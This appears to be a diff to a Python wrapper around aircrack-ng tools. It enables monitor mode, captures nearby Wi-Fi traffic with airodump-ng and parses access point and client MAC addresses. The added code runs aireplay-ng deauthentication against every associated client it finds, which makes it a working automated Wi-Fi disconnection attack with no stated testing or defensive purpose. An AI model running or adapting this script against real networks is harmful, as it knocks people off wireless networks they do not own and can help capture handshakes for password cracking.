@@ -26,9 +26,23 @@ def start_mon():
 		channel = str(input("Channel (to monitor): "))
 	except:
 		print("Something went wrong!")
+
+	try:
+		p1 = subprocess.Popen(["ip", "link"], stdout=subprocess.PIPE) # Try to find monX
+		p2 = subprocess.Popen(["awk", "{print $2}"], stdin=p1.stdout, stdout=subprocess.PIPE)
+		output = p2.communicate()[0]
+		output=output.split()
+		output=str(output)
+
+		#FIX THIS SHIT
+		if re.search(r"mon.", output):
+			print("Found monitor interface.")
+		else:
+			derp=subprocess.check_output(["airmon-ng", "start", wifi_iface, channel]) # Start capture
+	except:
+		print("derp")
 	
 	try:
-		derp=subprocess.check_output(["airmon-ng", "start", wifi_iface, channel]) # Start capture
 		p1 = subprocess.Popen(["ip", "link"], stdout=subprocess.PIPE) # Try to find mon0
 		p2 = subprocess.Popen(["awk", "{print $2}"], stdin=p1.stdout, stdout=subprocess.PIPE)
 		output = p2.communicate()[0]
@@ -41,7 +55,12 @@ def start_mon():
 					mon_iface="mon0"
 					break
 				elif ans == 'n':
-					break
+					mon_iface = str(input("Monitor interface: "))
+					if not mon_iface:
+						print("You suck.")
+						exit(1)
+					else:
+						break
 		else:
 			subprocess.Popen(["airmon-ng"])
 			mon_iface = str(input("Monitor interface: "))
@@ -69,10 +88,21 @@ def start_airodump(iface_ch):
 			print("Try again.")
 	try:
 		print("Collecting data..")
-		subprocess.call(["airodump-ng", "-c", channel, "-w", fname, mon_iface], timeout=duration).pid
+		aa = subprocess.check_output(["airodump-ng", "-c", channel, "-w", fname, mon_iface], timeout=duration).pid
 	except:
 		print("Done!")
 		return fname
+
+def start_aireplay(ap_mac, station_mac, iface_ch):
+	mon_iface = iface_ch[0]
+	#channel = iface_ch[1]
+	try:
+		print("Injecting frame into" + str(ap_mac))
+		derp = subprocess.check_output(["aireplay-ng", "-0", "1", "-a", ap_mac, "-c", station_mac, "--ignore-negative-one", mon_iface])
+	except:
+		print("Not sure if everything went okay.. exiting")
+		exit(1)
+	return True
 
 # MAIN
 if not check_user(): # Call function to check if user is root
@@ -118,4 +148,8 @@ for line in f_data:
 f_data = f_data[2:]
 for line in f_data:
 	f_data_temp = line.split(',')
-	station_macs[f_data_temp[0]] = f_data_temp[5]
+	station_macs[f_data_temp[0]] = f_data_temp[5].strip()
+
+for mac in station_macs:
+	if station_macs[mac] in ap_macs:
+		start_aireplay(station_macs[mac], mac, iface_ch)
